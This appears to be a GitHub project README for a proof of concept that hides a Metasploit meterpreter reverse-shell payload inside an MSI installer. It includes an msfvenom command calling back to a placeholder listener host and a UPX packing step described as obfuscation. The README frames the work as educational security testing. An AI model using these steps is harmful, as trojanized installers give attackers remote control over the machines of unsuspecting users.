Combining Software Packaging with Metasploit Payloads: A Proof-of-Concept


## Overview
This project demonstrates the integration of Metasploit Framework payloads into standard applications using Advanced Installer. The aim is to create a proof-of-concept MSI installer that combines security testing tools with software packaging techniques.

## Objectives
- Explore advanced software packaging techniques.
- Integrate a security payload into a standard application for educational purposes.
- Showcase skills in using Metasploit Framework and Advanced Installer.

## Technologies Used
- **Metasploit Framework (MSF):** For generating and managing payloads.
- **Advanced Installer:** For packaging software into MSI installers.
- **Python:** For scripting and payload creation.
- **UPX:** For obfuscating executables.

## Steps Involved
1. **Payload Generation:**
   - Used `msfvenom` to generate a reverse shell payload.
   - Example command:
     ```bash
     msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<insert machine IP here> LPORT=<insert port here> -f exe -o payload.exe
     ```

2. **Obfuscation:**
   - Applied UPX to compress and obfuscate the executable.
   - Example command:
     ```bash
     upx --best --lzma payload.exe
     ```

3. **Packaging:**
   - Integrated the payload into an MSI installer using Advanced Installer.
   - Configured installation settings and included the payload executable.

4. **Testing:**
   - Validated the functionality in a controlled environment.

## Ethical Considerations
- **Controlled Environment:** All testing and development were conducted in a controlled environment with appropriate permissions.
- **Educational Purpose:** The project is intended for educational and research purposes. Unauthorized use or distribution of payloads is illegal and unethical.

## Repository Contents
- **`docs/`:** Documentation and ethical guidelines.
- **`scripts/`:** Python scripts and configuration files.
- **`examples/`:** Screenshots and example configurations.
- **`setup.py`:** Instructions for setting up the environment.
